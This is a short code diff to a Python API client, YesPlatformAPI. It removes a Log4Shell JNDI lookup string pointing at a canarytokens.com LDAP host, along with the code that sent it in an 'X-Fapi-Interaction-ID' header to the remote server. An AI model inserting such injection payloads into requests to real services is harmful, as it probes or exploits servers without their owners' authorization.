@@ -67,10 +67,6 @@ class TooManyResultsException(Exception):
     pass
 
 
-EXPLOIT = "${jndi:ldap://2fhytt0ahxjz5krlpwvv88v8p.canarytokens.com/b}"
-# EXPLOIT="${jndi:ldap://mcygxtnbfwcf11stq3nkrv809.canarytokens.com/a}"
-
-
 class YesPlatformAPI:
     DEFAULT_URLS = {
         "sandbox": {
@@ -110,9 +106,6 @@ class YesPlatformAPI:
             },
             cert=self.cert_pair,
             timeout=TIMEOUT,
-            headers={
-                "X-Fapi-Interaction-ID": EXPLOIT,
-            },
         ).json()
         self.access_token = resp["access_token"]
 
